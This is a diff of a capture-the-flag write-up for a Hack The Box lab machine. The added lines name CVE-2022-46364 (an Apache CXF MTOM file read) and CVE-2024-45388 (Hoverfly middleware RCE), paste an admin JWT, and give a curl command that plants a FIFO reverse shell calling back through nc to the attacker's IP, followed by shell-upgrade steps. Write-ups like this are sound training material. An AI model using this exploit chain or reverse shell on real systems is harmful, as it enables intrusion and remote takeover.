@@ -597,6 +597,8 @@ At this point, I did not yet know whether the JAR was important, so I also spent
 
 After downloading the JAR, I decompiled it with JD-GUI. The important class was:
 
+![Alt text](../assets/htb/devarea/15.png)
+
 ```java
 package htb.devarea;
 
@@ -753,9 +755,13 @@ I spent time trying several direct XXE formats and XML entity tricks. They all f
 
 ---
 
-## 6. The real vulnerability: XOP/MTOM file inclusion
+## 6. CVE-2022-46364
 
 The real break came from using **XOP/MTOM** with `xop:Include` and a `file://` URI.
+
+| CVE            | Service                | Version           | Impact                                                                                | Severity                                               |
+| -------------- | ---------------------- | ----------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------ |
+| CVE-2022-46364 | Apache CXF (SOAP/MTOM) | ≤ 3.5.2 / ≤ 3.4.9 | SSRF / File Read — arbitrary files readable via XOP Include href in MTOM SOAP request | <span style="color:red; font-weight:bold;">HIGH</span> |
 
 A multipart request with:
 
@@ -959,7 +965,7 @@ That gave me:
 
 ---
 
-## 9. Hoverfly dashboard and middleware
+## 9. CVE-2024-45388 (HoverFly Middleware) -> RCE
 
 Using the leaked credentials, I logged into:
 
@@ -974,6 +980,16 @@ The dashboard showed:
 - synthesize mode
 - empty middleware configuration
 - empty simulation state
+
+![Alt text](../assets/htb/devarea/16.png)
+
+I got the admin token.
+
+![Alt text](../assets/htb/devarea/18.png)
+
+```
+eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODgxODA2MDcsImlhdCI6MTc3NzE0MDYwNywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.qPwoRhYRuMw3BuUnnscfkGLxf00BMpvbssOtqGPkcBZYgr9KcAeVCD97irbG4mwO3BhxRPT4rqMsUWoZIrXgnw
+```
 
 I checked the middleware API:
 
@@ -1006,11 +1022,15 @@ The correct approach was to use a shell-compatible FIFO reverse shell.
 
 Once the middleware was set properly, it confirmed execution on the target.
 
-### Another mistake
+```bash
+curl -X PUT http://10.129.39.37:8888/api/v2/hoverfly/middleware \
+-H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODgxODA2MDcsImlhdCI6MTc3NzE0MDYwNywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.qPwoRhYRuMw3BuUnnscfkGLxf00BMpvbssOtqGPkcBZYgr9KcAeVCD97irbG4mwO3BhxRPT4rqMsUWoZIrXgnw" \
+-H "Content-Type: application/json" \
+-d '{"binary":"/bin/sh","script":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.117 4444 > /tmp/f &"}'
 
-Before the successful payload, I confused the **target IP** with my **attacker IP** several times.
+```
 
-That caused connection refused errors because the target was trying to connect to itself instead of back to my Kali listener.
+![Alt text](../assets/htb/devarea/17.png)
 
 ---
 
@@ -1019,14 +1039,64 @@ That caused connection refused errors because the target was trying to connect t
 The successful shell came back as:
 
 ```text
-dev_ryan
+dev_ryan@devarea:/opt/HoverFly$
 ```
+
+### Fix shell (important)
+
+Inside the shell i got, run:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+stty rows 40 cols 120
+```
+
+Then press:
+
+```
+CTRL+Z
+```
+
+Back on my kali terminal:
+
+```bash
+stty raw -echo; fg
+```
+
+Then press Enter.
+
+Now my shell will behave normally.
 
 At this point the `user.txt` flag was available under:
 
 ```text
 /home/dev_ryan/user.txt
 ```
+
+![Alt text](../assets/htb/devarea/19.png)
+
+---
+
+## User flag
+
+<style>
+.flag-redacted {
+    background: #000;
+    color: transparent;
+    padding: 2px 6px;
+    border-radius: 4px;
+    filter: blur(3px);
+    transition: 0.2s;
+}
+
+.flag-redacted:hover {
+    filter: blur(0);
+    color: #ff3c3c;
+}
+</style>
+
+<code class="flag-redacted">REDACTED</code>
 
 ---
 
